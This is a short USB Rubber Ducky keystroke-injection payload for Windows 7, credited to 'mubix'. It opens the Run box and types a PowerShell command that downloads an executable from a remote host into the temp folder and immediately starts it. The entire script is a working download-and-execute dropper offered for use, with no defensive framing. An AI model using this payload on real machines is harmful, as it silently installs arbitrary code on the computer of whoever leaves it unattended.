Powershell Wget + Execute

Author: mubix
Duckencoder: 1.2
Target: Windows 7
Description: Opens “RUN” box, throws power shell string, enter. Supports HTTP/S, and proxies.
 GUI r
 DELAY 100
 STRING powershell (new-object System.Net.WebClient).DownloadFile('http://example.com/bob.old','%TEMP%\bob.exe'); Start-Process "%TEMP%\bob.exe"
 ENTER